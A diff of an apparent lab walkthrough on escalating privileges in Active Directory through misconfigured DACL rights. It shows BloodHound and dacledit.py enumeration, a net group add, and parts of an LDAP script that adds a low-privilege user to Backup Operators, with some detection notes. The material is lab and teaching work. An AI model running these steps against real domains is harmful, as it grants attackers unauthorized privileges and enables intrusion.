@@ -21,7 +21,7 @@ Complete walkthrough of exploiting DACL permissions via AddMembers rights in Act
 
 ### Enumeration
 
-**Identify users rights over TestGroup using BloodHound:**
+**Identify lowpriv's rights over TestGroup using BloodHound:**
 
 ```bash
 # Collect AD data
@@ -44,7 +44,7 @@ python3 examples/dacledit.py -principal lowpriv -target 'TestGroup' -dc-ip 10.10
 
 ### Exploitation
 
-**Add users to TestGroup:**
+**Add lowpriv to TestGroup:**
 
 ```bash
 # GenericWrite allows using net (not Self-Membership restricted)
@@ -78,7 +78,7 @@ cat flag.txt
 
 ### Enumeration
 
-**Identify users's rights over Backup Operators:**
+**Identify pedro's rights over Backup Operators:**
 
 ```bash
 # Using dacledit.py
@@ -100,17 +100,15 @@ python3 examples/dacledit.py -principal lowpriv -target 'Backup Operators' -dc-i
 
 **Critical**: Self-Membership requires LDAP protocol (net will fail with ACCESS_DENIED)
 
-**Create LDAP script (addusertogroup.py):**
+**LDAP group modification script (ldap_group_modifier.py):**
 
 ```python
-
 #!/usr/bin/env python3
 """
 LDAP Group Membership Modifier
 Adds users to Active Directory groups via direct LDAP operations.
 Useful for abusing Self-Membership and other attribute-level DACL rights
 that don't work through legacy SAMR/RPC interfaces.
-
 """
 
 import argparse
@@ -258,7 +256,7 @@ if __name__ == '__main__':
 **Execute the script:**
 
 ```bash
-python3 addusertogroup.py -d corp.local -g "Backup Operators" -a lowpriv -u lowpriv -p Password123
+python3 ldap_group_modifier.py -d corp.local -u lowpriv -p Password123 -g "Backup Operators" -m lowpriv
 ```
 
 **Verify membership:**
@@ -552,4 +550,3 @@ Event 4673 WHERE
 ---
 
 **Date**: February 2026
-
